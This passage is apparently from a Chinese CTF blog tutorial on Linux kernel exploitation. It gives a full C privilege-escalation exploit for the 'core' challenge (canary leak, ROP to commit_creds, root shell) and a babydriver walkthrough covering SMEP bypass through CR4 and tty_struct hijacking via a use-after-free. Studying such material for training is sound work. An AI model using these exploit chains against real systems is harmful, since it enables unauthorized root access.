class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line">	<span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line">	<span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line">	<span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line">	<span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line">		<span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line">		<span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line">		<span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line">		<span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">		output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line">				<span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line">			<span class="keyword">else</span>&#123;</span><br><span class="line">				<span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line">				<span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">					output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">		output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line">		<span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">		index += <span class="number">16</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">rise_cred</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="comment">// define two function pointer</span></span><br><span class="line">	<span class="type">void</span>* (*prepare_kernel_credp)(<span class="type">void</span>*) = prepare_kernel_cred;</span><br><span class="line">	<span class="type">int</span> (*commit_credsp)(<span class="type">void</span>*) = commit_creds;</span><br><span class="line">	commit_credsp(prepare_kernel_credp(<span class="literal">NULL</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(getuid())&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Getting the root......\033[0m\n&quot;</span>);</span><br><span class="line">	system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	saveStatus();</span><br><span class="line">	fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);		<span class="comment">// open the process</span></span><br><span class="line">	<span class="keyword">if</span>(!fd)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open process \&quot;core\&quot;\n\033[0m&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	get_function_address();		<span class="comment">// get addresses of two key function</span></span><br><span class="line">	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base_offset = commit_creds - commit_creds_base;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] KASLR offset: \033[0m%#llx\n&quot;</span>, base_offset);</span><br><span class="line">	</span><br><span class="line">	change_off(<span class="number">0x40</span>);			<span class="comment">// change the offset so that we can get canary later</span></span><br><span class="line">	core_read(buffer);			<span class="comment">// get canary</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Contents in buffer here:\033[0m\n&quot;</span>);	<span class="comment">// print content in buffer</span></span><br><span class="line">	print_binary(buffer, <span class="number">0x40</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> canary = ((<span class="type">size_t</span>*)&amp;buffer)[<span class="number">0</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[35m\033[1m[*] The value of canary is the first 8 bytes: \033[0m%#llx\n&quot;</span>, canary);</span><br><span class="line">	</span><br><span class="line">	<span class="type">size_t</span> ROP[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	<span class="built_in">memset</span>(ROP, <span class="number">0</span>, <span class="number">800</span>);</span><br><span class="line">	<span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">		ROP[idx++] = canary;</span><br><span class="line">	ROP[idx++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)rise_cred;</span><br><span class="line">	ROP[idx++] = swapgs_popfq_ret + base_offset;	<span class="comment">// step 1 of returning to user mode: swapgs</span></span><br><span class="line">	ROP[idx++] = <span class="number">0</span>;</span><br><span class="line">	ROP[idx++] = iretq + base_offset;				<span class="comment">// step 2 of returning to user mode: iretq</span></span><br><span class="line">	<span class="comment">// after the iretq: return address, user cs, user rflags, user sp, user ss</span></span><br><span class="line">	ROP[idx++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shell;</span><br><span class="line">	ROP[idx++] = user_cs;</span><br><span class="line">	ROP[idx++] = user_rflags;</span><br><span class="line">	ROP[idx++] = user_sp;</span><br><span class="line">	ROP[idx++] = user_ss;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Our rop chain looks like: \033[0m\n&quot;</span>);</span><br><span class="line">	print_binary((<span class="type">char</span>*)ROP, <span class="number">0x100</span>);</span><br><span class="line">	</span><br><span class="line">	write(fd, ROP, <span class="number">0x800</span>);</span><br><span class="line">	core_copy_func(<span class="number">0xffffffffffff0100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Kernel-Use-After-Free-amp-SMAP-x2F-SMEP-bypass"><a href="#Kernel-Use-After-Free-amp-SMAP-x2F-SMEP-bypass" class="headerlink" title="Kernel Use After Free &amp; SMAP&#x2F;SMEP bypass"></a>Kernel Use After Free &amp; SMAP&#x2F;SMEP bypass</h1><p>与用户态类似，内核中也可以利用UAF漏洞，但内存分配的方式完全不同。本漏洞利用使用另一道经典Kernel Pwn入门例题——CISCN-2017 babydriver。同时本题还需要进行SMAP&#x2F;SMEP的绕过，使我们能够ret2usr。<br>在本题中，给的文件系统有bzImage而没有vmlinux，但我们需要使用vmlinux获取到有用的gadget。此时就需要一个已经写好的官方脚本——extract_vmlinux进行vmlinux的提取。这是一个bash文件，只有几十行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_vmlinux</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line">	<span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line">	<span class="comment">#       and not just an elf</span></span><br><span class="line">	readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line">	<span class="built_in">cat</span> <span class="variable">$1</span></span><br><span class="line">	<span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">try_decompress</span></span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line">	<span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line">	<span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line">	<span class="keyword">for</span>	pos <span class="keyword">in</span> `<span class="built_in">tr</span> <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">		pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line">		<span class="built_in">tail</span> -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">		check_vmlinux <span class="variable">$tmp</span></span><br><span class="line">	<span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>	[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line">	<span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(<span class="built_in">mktemp</span> /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure>

<p>使用方法：<code>./extract_vmlinux bzImage &gt; vmlinux</code><br>执行后就能够在文件夹中找到vmlinux文件供我们分析。</p>
<p><strong>Step 1: 读取&#x2F;proc&#x2F;kallsyms获取内核函数地址</strong></p>
<p>本题与上一题均可以使用cat命令获取到内核函数的地址，但有所不同的是，在上一题，我们读取的是&#x2F;tmp&#x2F;kallsyms，是一个副本而不是&#x2F;proc&#x2F;kallsyms本身。&#x2F;proc&#x2F;kallsyms存放所有内核函数的地址，那为什么出题人还要大费周章地复制一份，为什么不能直接读取呢，&#x2F;proc文件夹又没有设置权限。我们不妨试一下，在上一题直接读取&#x2F;proc&#x2F;kallsyms会打印出什么东西。<br><img src="https://img-blog.csdnimg.cn/c109d13acad24dd5a1fa2698bb77c759.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_15,color_FFFFFF,t_70,g_se,x_16"><br>嗯？为什么这里的地址全都变成0了？仔细查看两道题中init文件的不同之处，我们发现了一丝端倪：<br><img src="https://img-blog.csdnimg.cn/3b3dbd355827494da19b5082f9babf8c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"><br>左边是这道题的init文件，右边是上一道题的init文件，我们发现上一道题对&#x2F;proc做了一些额外的处理。查阅<a target="_blank" rel="noopener" href="https://blog.csdn.net/gatieme/article/details/78311841?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165088900816782350946531%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=165088900816782350946531&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-78311841.142%5Ev9%5Econtrol,157%5Ev4%5Econtrol&utm_term=/proc/sys/kernel/kptr_restrict&spm=1018.2226.3001.4187">资料</a>后发现，问题出在<code>/proc/sys/kernel/kptr_restrict</code>。当其值为1时，普通用户无法获取到内核的任何地址值。但在本题中并没有这样的命令，因此可以直接读取&#x2F;proc&#x2F;kallsyms文件获取所有内核函数的地址。又因为本题中没有开启KASLR，因此两个关键函数的地址总是不变的，我们使用cat命令获取之后将其直接复制到我们的exp中就可以了。<br><img src="https://img-blog.csdnimg.cn/13e03819a5b64424b4d6aa57d4ff28e7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBATDNIX0NvTGlu,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
<p><strong>Step 2: 绕过SMAP&#x2F;SMEP</strong></p>
<p>在boot.sh中很容易就能发现本kernel开启了SMAP&#x2F;SMEP保护。在这种保护下内核无法直接访问用户空间的内容，其中SMEP表示内核无法执行用户空间的代码。我们可以通过修改CR4寄存器的第20位标记将这个保护手动关闭。<br><img src="https://img-blog.csdnimg.cn/ba76e314e8eb43c69eb314798b0b7f79.png"><br>我们使用前面通过脚本获取的vmlinux获取gadget，从中提取到了修改cr4寄存器的gadget地址为0xffffffff81004d80。<br><img src="https://img-blog.csdnimg.cn/2a8534129bd54f498598b74f133b7ce9.png"><br>但在修改cr4之前，我们需要确认一下cr4寄存器中的值到底是什么，毕竟我们要修改的只是SMEP保护，对于其他位不应做任何修改。由于cr4属于控制寄存器，在内核运行过程中一般不会改变。我们查询gadgets.txt看看能不能通过普通的寄存器将cr4的值套出来。<br><img src="https://img-blog.csdnimg.cn/7005e6236a1b416e9ee2e141828757f3.png"><br>这里我们选择将cr4寄存器的值保存到rax中，之后使用gdb进行调试，在此处下断点并跳转到此处即可查看。注意：本题的boot.sh中没有开启-s选项，需要手动修改才能将kernel映射到TCP的1234端口进行调试。</p>
<p><strong>调试方法：首先打开内核，之后在另一个终端输入<code>gdb vmlinux</code>，输入<code>target remote localhost:1234</code>即可attach到1234端口进行内核调试。</strong><br><img src="https://img-blog.csdnimg.cn/f2320a1dea734546897e96e07b0d6ad3.png"><br>在上图中，我们刚刚引导内核执行了mov rax,cr4指令（直接输入reg cr4是无法显示cr4寄存器的值的），可以看到cr4的值为0x1006f0，其中最高位的1代表SMEP保护开启。因此我们只需要将cr4的值改为0x6f0就能关闭保护。</p>
<p>这样一来，我们就知道了关闭保护的方法了。关闭保护之后，我们就可以使用上一道题的ROP进行提权，在本题中，ROP应该在最后一步被触发。我们写出ROP链：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> rop[<span class="number">20</span>];</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">rop[idx++] = poprdi_ret;			<span class="comment">// mov rdi, 6f0h</span></span><br><span class="line">rop[idx++] = <span class="number">0x6f0</span>;</span><br><span class="line">rop[idx++] = movcr4rdi_poprbp_ret;	<span class="comment">// close SMEP</span></span><br><span class="line">rop[idx++] = <span class="number">0</span>;						<span class="comment">// for pop rbp</span></span><br><span class="line">rop[idx++] = rise_cred;</span><br><span class="line">rop[idx++] = swapgs_poprbp_ret;		<span class="comment">// ready to return to user mode</span></span><br><span class="line">rop[idx++] = <span class="number">0</span>;</span><br><span class="line">rop[idx++] = iretq;</span><br><span class="line">rop[idx++] = shell;</span><br><span class="line">rop[idx++] = user_cs;</span><br><span class="line">rop[idx++] = user_rflags;</span><br><span class="line">rop[idx++] = user_sp;</span><br><span class="line">rop[idx++] = user_ss;</span><br></pre></td></tr></table></figure>

<p><strong>Step 3: UAF</strong><br>在ROP确定之后，接下来要思考的就是如何通过UAF触发ROP。</p>
<p><img src="https://img-blog.csdnimg.cn/488ede4b67be4f60a8983c16f61abe71.png"><br>在模块加载时，会创建一个设备名为babydev，在&#x2F;dev&#x2F;babydev。<br><img src="https://img-blog.csdnimg.cn/b7b80117aaeb476980917ed990f21c65.png"><br>在本题的file_operations结构体中，定义有open函数对应的函数指针为babyopen，在我们打开&#x2F;dev&#x2F;babydev时会执行这个函数。<br><img src="https://img-blog.csdnimg.cn/cbbed073e01b4dde948db6741ea7fadb.png"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __always_inline __alloc_size(<span class="number">3</span>) <span class="type">void</span> *<span class="title function_">kmem_cache_alloc_trace</span><span class="params">(<span class="keyword">struct</span> kmem_cache *s,</span></span><br><span class="line"><span class="params">								    <span class="type">gfp_t</span> flags, <span class="type">size_t</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">void</span> *ret = kmem_cache_alloc(s, flags);</span><br><span class="line"></span><br><span class="line">	ret = kasan_kmalloc(s, ret, size, flags);</span><br><span class="line">	<span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面是kmem_cache_alloc_trace函数的源码，这是一个内核内存分配的函数，可以看到babyopen中分配的内存大小为0x40，分配得到的内存指针会保存到一个全局变量babydev_struct之中。<br><img src="https://img-blog.csdnimg.cn/a71e425e15624b2ab6a60fc4cfbda452.png"><br>在babyrelease函数中会将我们分配的指针释放。但是由于模块在内存中只会加载一个，当我们同时打开两次此设备时，两设备实际上是相同的，全局变量共用，在一个设备中kfree，但是在另一个设备中仍然可以进行操作，这便是UAF，与用户态pwn相同。我们以可读可写的方式打开此设备，因此open函数的第二个参数为2。（下图为参数说明）<br><img src="https://img-blog.csdnimg.cn/dc7fb4e8310142b2ad8d74dd261c35d6.png"><br>再来看下babyioctl函数。<br><img src="https://img-blog.csdnimg.cn/6b324097cb46482e8a4ace2b6f535699.png"><br>这里的反汇编似乎有点问题，kmalloc的第一个参数应该是size，但是这里肯定不是传入一个未初始化的值。<img src="https://img-blog.csdnimg.cn/be372a278a9e4bb98daf1f192dc85796.png"><br>从汇编可以知道这里传入kmalloc的第一个参数实际上就是我们ioctl函数调用的第三个参数，也即我们可以通过ioctl函数修改这里分配到的内存的大小。</p>
<p><img src="https://img-blog.csdnimg.cn/1e5c6013c598453db59bea4f720164bc.png"><br>经过实验发现，此处的UAF利用没有问题，能够通过释放的指针修改被释放空间的值。</p>
<blockquote>
<p>（摘自<a target="_blank" rel="noopener" href="https://arttnba3.cn/2021/03/03/NOTE-0X03-LINUX-KERNEL-PWN-PART-II/#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%EF%BC%9AKernel-UAF-stack-migitation-SMEP-bypass-ret2usr">资料</a>）<br>在 &#x2F;dev 下有一个伪终端设备 ptmx ，在我们打开这个设备时内核中会创建一个 tty_struct 结构体，与其他类型设备相同，tty驱动设备中同样存在着一个存放着函数指针的结构体 tty_operations<br>那么我们不难想到的是我们可以通过 UAF 劫持 &#x2F;dev&#x2F;ptmx 这个设备的 tty_struct 结构体与其内部的 tty_operations 函数表，那么在我们对这个设备进行相应操作（如write、ioctl）时便会执行我们布置好的恶意函数指针</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/8ac856f765df40aea13f56983d852969.png"><br>可以看到，通过UAF我们可以成功读取到tty_struct的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> &#123;</span></span><br><span class="line">	<span class="type">int</span>	magic;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kref</span> <span class="title">kref</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">device</span> *<span class="title">dev</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>;</span></span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">	<span class="type">int</span> index;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Protects ldisc changes: Lock tty not pty */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ld_semaphore</span> <span class="title">ldisc_sem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">tty_ldisc</span> *<span class="title">ldisc</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">atomic_write_lock</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">legacy_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">throttle_mutex</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">rw_semaphore</span> <span class="title">termios_rwsem</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span> <span class="title">winsize_mutex</span>;</span></span><br><span class="line">	<span class="type">spinlock_t</span> ctrl_lock;</span><br><span class="line">	<span class="type">spinlock_t</span> flow_lock;</span><br><span class="line">	<span class="comment">/* Termios values are protected by the termios rwsem */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">ktermios</span> <span class="title">termios</span>, <span class="title">termios_locked</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>	<span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">	<span class="type">char</span> name[<span class="number">64</span>];</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>		<span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> flags;</span><br><span class="line">	<span class="type">int</span> count;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>		<span class="comment">/* winsize_mutex */</span></span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> stopped:<span class="number">1</span>,	<span class="comment">/* flow_lock */</span></span><br><span class="line">		      flow_stopped:<span class="number">1</span>,</span><br><span class="line">		      unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">	<span class="type">int</span> hw_stopped;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">long</span> ctrl_status:<span class="number">8</span>,	<span class="comment">/* ctrl_lock */</span></span><br><span class="line">		      packet:<span class="number">1</span>,</span><br><span class="line">		      